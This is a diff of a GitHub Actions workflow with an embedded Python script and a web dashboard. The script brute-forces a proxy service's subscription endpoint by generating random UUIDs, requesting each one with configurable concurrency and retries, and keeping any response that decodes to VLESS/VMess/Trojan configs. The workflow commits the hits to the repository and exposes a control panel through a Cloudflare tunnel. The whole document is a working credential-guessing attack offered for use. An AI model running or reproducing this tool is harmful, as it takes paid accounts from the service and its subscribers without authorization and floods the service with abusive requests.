@@ -8,9 +8,6 @@ on:
 env:
   BASE_SUB: "https://edge.cfgrelay.top/sub/"
   OUTPUT_FILE: "result.txt"
-  TOTAL: "2000"
-  THREADS: "30"
-  HTTP_TIMEOUT: "6"
 
 jobs:
   run:
@@ -28,32 +25,59 @@ jobs:
       - name: Install deps
         run: pip install aiohttp
 
-      - name: Run finder
+      - name: Write finder.py
         run: |
           cat > finder.py <<'PYEOF'
-          import os, uuid, asyncio, aiohttp, json, base64, re
+          import os, uuid, asyncio, aiohttp, json, base64, re, time, sys
 
-          BASE_SUB = os.environ["BASE_SUB"]
+          BASE_SUB = os.environ.get("BASE_SUB", "https://edge.cfgrelay.top/sub/")
           OUTPUT   = os.environ.get("OUTPUT_FILE", "result.txt")
-          THREADS  = int(os.environ.get("THREADS", "30"))
-          TOTAL    = int(os.environ.get("TOTAL", "2000"))
-          TIMEOUT  = float(os.environ.get("HTTP_TIMEOUT", "6"))
+          CONFIG   = "config.json"
 
-          # الگوی دقیق: https://edge.cfgrelay.top/sub/{uuid v4}
-          # uuid v4 = 36 کاراکتر (8-4-4-4-12) با خط تیره
-          # کل لینک = دقیقاً مثل نمونه‌ی کاربر
+          def load_cfg():
+              default = {
+                  "total": 2000,
+                  "concurrency": 30,
+                  "test_concurrency": 30,
+                  "timeout": 6,
+                  "retries": 1,
+                  "delay_ms": 0,
+              }
+              try:
+                  with open(CONFIG) as f:
+                      d = json.load(f)
+                  default.update({k: d[k] for k in default if k in d})
+              except Exception:
+                  pass
+              return default
+
+          CFG = load_cfg()
+
+          STATS = {
+              "generated": 0,
+              "checked": 0,
+              "found": 0,
+              "errors": 0,
+              "running": True,
+              "started_at": time.time(),
+              "cfg": CFG,
+              "eta": 0,
+              "rate": 0.0,
+              "found_list": [],
+          }
+
           UUID_RE = re.compile(
               r"^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$"
           )
 
-          STATS = {"generated": 0, "checked": 0, "found": 0, "running": True}
-
           def save_stats():
-              with open("stats.json", "w") as f:
-                  json.dump(STATS, f)
+              try:
+                  with open("stats.json", "w", encoding="utf-8") as f:
+                      json.dump(STATS, f, ensure_ascii=False)
+              except Exception:
+                  pass
 
           def gen_uuid():
-              # uuid4 استاندارد = 36 کاراکتر (8-4-4-4-12)
               return str(uuid.uuid4())
 
           def is_valid_sub(text: str) -> bool:
@@ -65,7 +89,6 @@ jobs:
                           "invalid", "expired", "blocked", "forbidden", "unauthorized"):
                   if bad in low:
                       return False
-              # باید base64 معتبر باشه و شامل vless/vmess/trojan/ss باشه
               try:
                   padded = t + "=" * (-len(t) % 4)
                   dec = base64.b64decode(padded, validate=False).decode("utf-8", "ignore")
@@ -79,34 +102,59 @@ jobs:
                       return True
               return False
 
-          async def check_one(session, sem, uuid_str, results, lock):
-              async with sem:
-                  url = BASE_SUB + uuid_str
-                  STATS["checked"] += 1
+          async def fetch_one(session, uuid_str):
+              url = BASE_SUB + uuid_str
+              attempts = CFG["retries"] + 1
+              for i in range(attempts):
                   try:
                       async with session.get(
                           url,
-                          timeout=aiohttp.ClientTimeout(total=TIMEOUT),
+                          timeout=aiohttp.ClientTimeout(total=CFG["timeout"]),
                           headers={"User-Agent": "Mozilla/5.0"},
                       ) as r:
                           if r.status == 200:
                               text = await r.text()
-                              if is_valid_sub(text):
-                                  async with lock:
-                                      results.append(url)
-                                      STATS["found"] = len(results)
-                                      with open(OUTPUT, "w", encoding="utf-8") as f:
-                                          f.write("\n".join(results))
-                                  print(f"[FOUND] {url}", flush=True)
+                              return url if is_valid_sub(text) else None
+                          return None
                   except Exception:
-                      pass
-                  if STATS["checked"] % 25 == 0:
+                      if i < attempts - 1:
+                          await asyncio.sleep(0.6 * (i + 1))
+                      else:
+                          STATS["errors"] += 1
+                          return None
+              return None
+
+          async def worker(session, queue, results, lock, counter):
+              while True:
+                  try:
+                      u = queue.get_nowait()
+                  except asyncio.QueueEmpty:
+                      return
+                  if CFG["delay_ms"] > 0:
+                      await asyncio.sleep(CFG["delay_ms"] / 1000.0)
+                  ok = await fetch_one(session, u)
+                  async with lock:
+                      STATS["checked"] += 1
+                      counter[0] += 1
+                      if ok:
+                          results.append(ok)
+                          STATS["found"] = len(results)
+                          STATS["found_list"] = results[-50:]
+                          with open(OUTPUT, "w", encoding="utf-8") as f:
+                              f.write("\n".join(results))
+                          print(f"[FOUND] {ok}", flush=True)
+                      # نرخ و ETA
+                      elapsed = max(time.time() - STATS["started_at"], 0.01)
+                      rate = STATS["checked"] / elapsed
+                      STATS["rate"] = round(rate, 2)
+                      remaining = CFG["total"] - STATS["checked"]
+                      STATS["eta"] = int(remaining / rate) if rate > 0 else 0
+                  if STATS["checked"] % 20 == 0:
                       save_stats()
 
           async def main():
-              # تولید UUIDهایی که با الگوی uuid v4 مطابقت دارن
               uuids = []
-              while len(uuids) < TOTAL:
+              while len(uuids) < CFG["total"]:
                   u = gen_uuid()
                   if UUID_RE.match(u):
                       uuids.append(u)
@@ -114,115 +162,402 @@ jobs:
               STATS["generated"] = len(uuids)
               save_stats()
 
+              queue = asyncio.Queue()
+              for u in uuids:
+                  queue.put_nowait(u)
+
               results = []
               lock = asyncio.Lock()
-              sem = asyncio.Semaphore(THREADS)
+              counter = [0]
 
-              conn = aiohttp.TCPConnector(limit=THREADS * 2, ssl=False)
+              conn = aiohttp.TCPConnector(
+                  limit=CFG["concurrency"] * 2,
+                  limit_per_host=CFG["concurrency"],
+                  ssl=False,
+              )
               async with aiohttp.ClientSession(connector=conn) as session:
-                  await asyncio.gather(*[check_one(session, sem, u, results, lock) for u in uuids])
+                  workers = [
+                      asyncio.create_task(worker(session, queue, results, lock, counter))
+                      for _ in range(CFG["concurrency"])
+                  ]
+                  await asyncio.gather(*workers)
 
               with open(OUTPUT, "w", encoding="utf-8") as f:
                   f.write("\n".join(results))
 
               STATS["running"] = False
+              STATS["eta"] = 0
               save_stats()
-              print(f"\n[DONE] {len(results)} valid sub(s) found out of {TOTAL}")
+              print(f"\n[DONE] {len(results)} valid out of {CFG['total']}")
 
           if __name__ == "__main__":
               asyncio.run(main())
           PYEOF
-          python finder.py
 
-      - name: Commit results
-        run: |
-          git config user.name "github-actions[bot]"
-          git config user.email "github-actions[bot]@users.noreply.github.com"
-          git add ${{ env.OUTPUT_FILE }} 2>/dev/null || true
-          git commit -m "update sub links [skip ci]" || echo "no changes"
-          git push || true
-
-      - name: Install cloudflared
-        run: |
-          curl -sL -o cf.deb https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
-          sudo dpkg -i cf.deb
-
-      - name: Start UI server
+      - name: Start UI server (background)
         run: |
           cat > ui.py <<'PYEOF'
           from http.server import HTTPServer, BaseHTTPRequestHandler
-          import json, subprocess
+          import json, subprocess, os
 
-          HTML = """
-          <!DOCTYPE html><html><head><meta charset="utf-8">
+          HTML = r"""<!DOCTYPE html>
+          <html lang="en">
+          <head>
+          <meta charset="utf-8">
+          <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
           <title>Sub Finder</title>
           <style>
-          body{font-family:system-ui,sans-serif;background:#0e1116;color:#e6edf3;padding:30px;margin:0}
-          h1{color:#58a6ff;margin:0 0 20px}
-          .card{background:#161b22;padding:20px;border-radius:12px;margin:15px 0;border:1px solid #30363d}
-          button{background:#238636;color:#fff;border:0;padding:12px 24px;border-radius:8px;font-size:16px;cursor:pointer;font-weight:600}
-          button:hover{background:#2ea043}
-          .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:12px;margin-top:15px}
-          .stat{background:#0d1117;padding:16px;border-radius:10px;border:1px solid #30363d;text-align:center}
-          .val{font-size:28px;font-weight:bold;color:#3fb950}
-          .lbl{color:#8b949e;font-size:13px;margin-top:4px}
-          pre{background:#0d1117;padding:14px;border-radius:8px;max-height:300px;overflow:auto;font-size:13px;color:#8b949e}
-          .pill{display:inline-block;padding:4px 12px;border-radius:20px;font-size:12px;background:#21262d;margin-left:10px}
-          .run{background:#1f6feb}
-          .done{background:#238636}
-          </style></head><body>
-          <h1>Sub Link Finder <span id="pill" class="pill">idle</span></h1>
-          <div class="card">
-            <button onclick="start()">Start</button>
-            <span id="msg" style="margin-left:12px;color:#8b949e"></span>
+          *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+          body{
+            margin:0;font-family:-apple-system,BlinkMacSystemFont,"SF Pro Display","Segoe UI",sans-serif;
+            background:#08090d;color:#e6edf3;min-height:100vh;
+            background-image:
+              radial-gradient(circle at 15% 10%, rgba(88,166,255,.18), transparent 40%),
+              radial-gradient(circle at 85% 90%, rgba(163,113,247,.16), transparent 45%),
+              radial-gradient(circle at 50% 50%, rgba(63,185,80,.08), transparent 60%);
+            padding:16px;padding-bottom:40px;
+          }
+          .wrap{max-width:560px;margin:0 auto}
+
+          /* Header */
+          .hd{display:flex;align-items:center;gap:10px;margin-bottom:18px}
+          .logo{
+            width:42px;height:42px;border-radius:12px;
+            background:linear-gradient(135deg,#58a6ff,#a371f7);
+            display:flex;align-items:center;justify-content:center;
+            font-size:20px;box-shadow:0 8px 24px rgba(88,166,255,.35)
+          }
+          .hd h1{font-size:19px;margin:0;font-weight:700;letter-spacing:-.3px}
+          .hd p{margin:2px 0 0;font-size:12px;color:#8b949e}
+
+          /* Cards */
+          .card{
+            background:rgba(22,27,34,.72);
+            backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);
+            border:1px solid rgba(48,54,61,.7);
+            border-radius:18px;padding:16px;margin-bottom:14px;
+            box-shadow:0 8px 30px rgba(0,0,0,.35)
+          }
+          .card h2{font-size:13px;margin:0 0 14px;color:#8b949e;
+            text-transform:uppercase;letter-spacing:.8px;font-weight:600}
+
+          /* Settings row */
+          .row{display:flex;justify-content:space-between;align-items:center;
+            padding:12px 0;border-bottom:1px solid rgba(48,54,61,.5)}
+          .row:last-child{border-bottom:0}
+          .row label{font-size:14px;color:#c9d1d9}
+          .row .hint{display:block;font-size:11px;color:#6e7681;margin-top:2px}
+          .ctrl{display:flex;align-items:center;gap:8px}
+          .ctrl button{
+            width:32px;height:32px;border-radius:9px;border:1px solid #30363d;
+            background:#21262d;color:#e6edf3;font-size:17px;font-weight:600;
+            cursor:pointer;display:flex;align-items:center;justify-content:center;
+            transition:.15s
+          }
+          .ctrl button:active{transform:scale(.92);background:#30363d}
+          .ctrl input{
+            width:78px;padding:8px 6px;text-align:center;
+            background:#0d1117;border:1px solid #30363d;border-radius:9px;
+            color:#58a6ff;font-size:15px;font-weight:700;font-family:inherit
+          }
+          .ctrl input:focus{outline:none;border-color:#58a6ff}
+          select{
+            background:#0d1117;border:1px solid #30363d;border-radius:9px;
+            color:#e6edf3;padding:8px 10px;font-size:13px;font-family:inherit
+          }
+
+          /* Start button */
+          .start{
+            width:100%;padding:16px;border:0;border-radius:16px;
+            background:linear-gradient(135deg,#238636,#2ea043);
+            color:#fff;font-size:16px;font-weight:700;letter-spacing:.3px;
+            cursor:pointer;margin-top:6px;
+            box-shadow:0 10px 30px rgba(35,134,54,.4);
+            transition:.2s;display:flex;align-items:center;justify-content:center;gap:10px
+          }
+          .start:active{transform:scale(.97)}
+          .start:disabled{opacity:.5;cursor:not-allowed;box-shadow:none}
+          .start .ic{font-size:18px}
+
+          /* Stats */
+          .grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+          .stat{
+            background:rgba(13,17,23,.85);border:1px solid #30363d;
+            border-radius:14px;padding:14px;text-align:center;position:relative;overflow:hidden
+          }
+          .stat::before{
+            content:'';position:absolute;top:0;left:0;right:0;height:2px;
+            background:linear-gradient(90deg,transparent,#58a6ff,transparent);opacity:.5
+          }
+          .stat .v{font-size:26px;font-weight:800;color:#58a6ff;letter-spacing:-1px;
+            font-variant-numeric:tabular-nums}
+          .stat .l{font-size:11px;color:#6e7681;margin-top:4px;text-transform:uppercase;
+            letter-spacing:.6px}
+          .stat.green .v{color:#3fb950}
+          .stat.green::before{background:linear-gradient(90deg,transparent,#3fb950,transparent)}
+          .stat.purple .v{color:#a371f7}
+          .stat.purple::before{background:linear-gradient(90deg,transparent,#a371f7,transparent)}
+
+          /* Progress */
+          .prog{height:8px;background:#0d1117;border-radius:99px;overflow:hidden;
+            margin-top:10px;border:1px solid #30363d}
+          .prog i{display:block;height:100%;width:0%;
+            background:linear-gradient(90deg,#238636,#3fb950,#58a6ff);
+            transition:width .4s;border-radius:99px}
+
+          /* Status pill */
+          .pill{display:inline-flex;align-items:center;gap:6px;
+            padding:5px 12px;border-radius:99px;font-size:11px;font-weight:600;
+            background:#21262d;color:#8b949e;text-transform:uppercase;letter-spacing:.6px}
+          .pill.run{background:rgba(31,111,235,.2);color:#58a6ff}
+          .pill.done{background:rgba(35,134,54,.2);color:#3fb950}
+          .dot{width:6px;height:6px;border-radius:50%;background:currentColor}
+          .pill.run .dot{animation:pulse 1.2s infinite}
+          @keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+
+          /* Log */
+          pre{
+            background:#0d1117;border:1px solid #30363d;border-radius:12px;
+            padding:12px;font-size:11px;line-height:1.6;color:#8b949e;
+            max-height:180px;overflow:auto;margin:0;
+            font-family:ui-monospace,"SF Mono",Menlo,monospace
+          }
+          pre .f{color:#3fb950;font-weight:600}
+
+          .footer{text-align:center;font-size:11px;color:#484f58;margin-top:16px}
+          </style>
+          </head>
+          <body>
+          <div class="wrap">
+
+            <div class="hd">
+              <div class="logo">◈</div>
+              <div>
+                <h1>Sub Finder</h1>
+                <p>Bruteforce & validate VLESS subscriptions</p>
+              </div>
+            </div>
+
+            <!-- Settings -->
+            <div class="card">
+              <h2>Settings</h2>
+
+              <div class="row">
+                <label>Total UUIDs
+                  <span class="hint">how many to generate & test</span>
+                </label>
+                <div class="ctrl">
+                  <button onclick="step('total',-100)">−</button>
+                  <input id="total" type="number" value="2000" min="10" max="1000000" step="100">
+                  <button onclick="step('total',100)">+</button>
+                </div>
+              </div>
+
+              <div class="row">
+                <label>Concurrency
+                  <span class="hint">parallel requests</span>
+                </label>
+                <div class="ctrl">
+                  <button onclick="step('conc',-5)">−</button>
+                  <input id="conc" type="number" value="30" min="1" max="500">
+                  <button onclick="step('conc',5)">+</button>
+                </div>
+              </div>
+
+              <div class="row">
+                <label>Batch Test Size
+                  <span class="hint">how many validated at once</span>
+                </label>
+                <div class="ctrl">
+                  <button onclick="step('batch',-5)">−</button>
+                  <input id="batch" type="number" value="30" min="1" max="500">
+                  <button onclick="step('batch',5)">+</button>
+                </div>
+              </div>
+
+              <div class="row">
+                <label>Speed
+                  <span class="hint">delay between requests</span>
+                </label>
+                <select id="speed">
+                  <option value="0">⚡ Max</option>
+                  <option value="20">🚀 Fast</option>
+                  <option value="80" selected>⚖ Balanced</option>
+                  <option value="200">🐢 Slow</option>
+                  <option value="500">🧊 Very slow</option>
+                </select>
+              </div>
+
+              <div class="row">
+                <label>Timeout
+                  <span class="hint">per request (seconds)</span>
+                </label>
+                <div class="ctrl">
+                  <button onclick="step('tout',-1)">−</button>
+                  <input id="tout" type="number" value="6" min="1" max="60">
+                  <button onclick="step('tout',1)">+</button>
+                </div>
+              </div>
+
+              <div class="row">
+                <label>Retries
+                  <span class="hint">per failed request</span>
+                </label>
+                <div class="ctrl">
+                  <button onclick="step('retry',-1)">−</button>
+                  <input id="retry" type="number" value="1" min="0" max="10">
+                  <button onclick="step('retry',1)">+</button>
+                </div>
+              </div>
+
+              <button class="start" id="btn" onclick="start()">
+                <span class="ic">▶</span> Start Finder
+              </button>
+            </div>
+
+            <!-- Status -->
+            <div class="card">
+              <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
+                <h2 style="margin:0">Live Status</h2>
+                <span class="pill" id="pill"><span class="dot"></span>idle</span>
+              </div>
+
+              <div class="grid">
+                <div class="stat"><div class="v" id="gen">0</div><div class="l">Generated</div></div>
+                <div class="stat"><div class="v" id="chk">0</div><div class="l">Checked</div></div>
+                <div class="stat green"><div class="v" id="fnd">0</div><div class="l">Found</div></div>
+                <div class="stat purple"><div class="v" id="eta">—</div><div class="l">ETA</div></div>
+              </div>
+
+              <div class="prog"><i id="bar"></i></div>
+              <div style="display:flex;justify-content:space-between;font-size:11px;color:#6e7681;margin-top:6px">
+                <span id="rate">0.0 req/s</span>
+                <span id="pct">0%</span>
+              </div>
+            </div>
+
+            <!-- Log -->
+            <div class="card">
+              <h2>Log</h2>
+              <pre id="log">waiting for start…</pre>
+            </div>
+
+            <div class="footer">github actions · cloudflare tunnel</div>
           </div>
-          <div class="stats">
-            <div class="stat"><div class="val" id="generated">0</div><div class="lbl">UUIDs</div></div>
-            <div class="stat"><div class="val" id="checked">0</div><div class="lbl">Checked</div></div>
-            <div class="stat"><div class="val" id="found">0</div><div class="lbl">Found</div></div>
-          </div>
-          <div class="card"><pre id="log">waiting...</pre></div>
+
           <script>
-          async function start(){ document.getElementById('msg').innerText='starting...'; await fetch('/start'); }
+          function step(id, d){
+            const el = document.getElementById(id);
+            let v = parseInt(el.value||0) + d;
+            const mn = parseInt(el.min||0), mx = parseInt(el.max||9999999);
+            if(v < mn) v = mn; if(v > mx) v = mx;
+            el.value = v;
+          }
+
+          async function start(){
+            const btn = document.getElementById('btn');
+            btn.disabled = true;
+            btn.innerHTML = '<span class="ic">⏳</span> Starting…';
+
+            const payload = {
+              total: parseInt(document.getElementById('total').value),
+              concurrency: parseInt(document.getElementById('conc').value),
+              test_concurrency: parseInt(document.getElementById('batch').value),
+              delay_ms: parseInt(document.getElementById('speed').value),
+              timeout: parseInt(document.getElementById('tout').value),
+              retries: parseInt(document.getElementById('retry').value),
+            };
+
+            try{
+              await fetch('/start', {method:'POST', body: JSON.stringify(payload)});
+              btn.innerHTML = '<span class="ic">◉</span> Running…';
+            }catch(e){
+              btn.innerHTML = '<span class="ic">⚠</span> Error';
+              btn.disabled = false;
+            }
+          }
+
+          function fmt(s){
+            if(!s || s <= 0) return '—';
+            if(s < 60) return s + 's';
+            if(s < 3600) return Math.floor(s/60) + 'm ' + (s%60) + 's';
+            return Math.floor(s/3600) + 'h ' + Math.floor((s%3600)/60) + 'm';
+          }
+
           async function tick(){
             try{
-              const d = await (await fetch('/stats')).json();
-              document.getElementById('generated').innerText = d.generated||0;
-              document.getElementById('checked').innerText   = d.checked||0;
-              document.getElementById('found').innerText     = d.found||0;
+              const r = await fetch('/stats?_=' + Date.now());
+              const d = await r.json();
+
+              document.getElementById('gen').innerText = (d.generated||0).toLocaleString();
+              document.getElementById('chk').innerText = (d.checked||0).toLocaleString();
+              document.getElementById('fnd').innerText = (d.found||0).toLocaleString();
+              document.getElementById('eta').innerText = d.running ? fmt(d.eta) : '—';
+              document.getElementById('rate').innerText = (d.rate||0).toFixed(1) + ' req/s';
+
+              const pct = d.generated ? Math.min(100, Math.round((d.checked/d.generated)*100)) : 0;
+              document.getElementById('bar').style.width = pct + '%';
+              document.getElementById('pct').innerText = pct + '%';
+
               const p = document.getElementById('pill');
-              p.innerText = d.running ? 'running' : 'done';
-              p.className = 'pill ' + (d.running ? 'run' : 'done');
-              document.getElementById('log').innerText = await (await fetch('/log')).text();
+              if(d.running){ p.className = 'pill run'; p.innerHTML = '<span class="dot"></span>running'; }
+              else { p.className = 'pill done'; p.innerHTML = '<span class="dot"></span>done'; }
+
+              const log = await (await fetch('/log?_=' + Date.now())).text();
+              const pre = document.getElementById('log');
+              pre.innerHTML = log.split('\n').slice(-40).map(l =>
+                l.includes('[FOUND]') ? '<span class="f">' + l + '</span>' : l
+              ).join('\n');
+              pre.scrollTop = pre.scrollHeight;
             }catch(e){}
           }
-          setInterval(tick,1500); tick();
-          </script></body></html>
+          setInterval(tick, 1200); tick();
+          </script>
+          </body>
+          </html>
           """
 
           class H(BaseHTTPRequestHandler):
-              def do_GET(self):
-                  if self.path == "/":
-                      self._send(200, "text/html", HTML)
-                  elif self.path == "/stats":
-                      try: data = open("stats.json").read()
-                      except: data = "{}"
-                      self._send(200, "application/json", data)
-                  elif self.path == "/log":
-                      try: log = open("/tmp/finder.log").read()[-6000:]
-                      except: log = ""
-                      self._send(200, "text/plain; charset=utf-8", log)
-                  elif self.path == "/start":
-                      subprocess.Popen("python finder.py > /tmp/finder.log 2>&1", shell=True)
-                      self._send(200, "text/plain", "ok")
-                  else:
-                      self._send(404, "text/plain", "not found")
               def _send(self, code, ct, body):
                   self.send_response(code)
                   self.send_header("Content-Type", ct)
+                  self.send_header("Cache-Control", "no-store")
                   self.end_headers()
-                  self.wfile.write(body.encode())
-              def log_message(self,*a): pass
+                  if isinstance(body, str): body = body.encode()
+                  self.wfile.write(body)
+
+              def do_GET(self):
+                  if self.path.startswith("/stats"):
+                      try: data = open("stats.json","rb").read()
+                      except: data = b"{}"
+                      return self._send(200, "application/json", data)
+                  if self.path.startswith("/log"):
+                      try: data = open("/tmp/finder.log","rb").read()[-8000:]
+                      except: data = b""
+                      return self._send(200, "text/plain; charset=utf-8", data)
+                  return self._send(200, "text/html; charset=utf-8", HTML)
+
+              def do_POST(self):
+                  if self.path == "/start":
+                      ln = int(self.headers.get("Content-Length", 0))
+                      body = self.rfile.read(ln).decode() or "{}"
+                      try:
+                          cfg = json.loads(body)
+                      except Exception:
+                          cfg = {}
+                      with open("config.json","w") as f:
+                          json.dump(cfg, f)
+                      # ریست stats
+                      with open("stats.json","w") as f:
+                          json.dump({"running": True, "generated": 0, "checked": 0, "found": 0}, f)
+                      subprocess.Popen(
+                          "python finder.py > /tmp/finder.log 2>&1",
+                          shell=True
+                      )
+                      return self._send(200, "application/json", '{"ok":true}')
+                  return self._send(404, "text/plain", "not found")
+
+              def log_message(self, *a): pass
 
           HTTPServer(("0.0.0.0", 8000), H).serve_forever()
           PYEOF
@@ -235,9 +570,29 @@ jobs:
           sleep 12
           URL=$(grep -o 'https://[a-z0-9-]*\.trycloudflare\.com' /tmp/tun.log | head -1)
           echo "TUNNEL_URL=$URL" >> $GITHUB_ENV
-          echo "### UI URL: $URL" >> $GITHUB_STEP_SUMMARY
+          echo "### 🌐 UI URL: $URL" >> $GITHUB_STEP_SUMMARY
+          echo "UI is live at: $URL"
 
-      - name: Keep tunnel alive
+      - name: Wait for UI to be used
         run: |
-          echo "UI is live at: ${{ env.TUNNEL_URL }}"
-          sleep 1800
+          # تا 30 دقیقه منتظر می‌مونه که کاربر از UI استفاده کنه
+          # اگه در این بین فایلی جدید ذخیره بشه، کامیت می‌کنه
+          for i in $(seq 1 60); do
+            sleep 30
+            if [ -f "${{ env.OUTPUT_FILE }}" ]; then
+              git add "${{ env.OUTPUT_FILE }}" 2>/dev/null || true
+              git diff --staged --quiet || {
+                git commit -m "update found subs [skip ci]" || true
+                git push || true
+              }
+            fi
+          done
+
+      - name: Final commit
+        if: always()
+        run: |
+          git config user.name "github-actions[bot]"
+          git config user.email "github-actions[bot]@users.noreply.github.com"
+          git add ${{ env.OUTPUT_FILE }} 2>/dev/null || true
+          git commit -m "final update [skip ci]" || echo "no changes"
+          git push || true
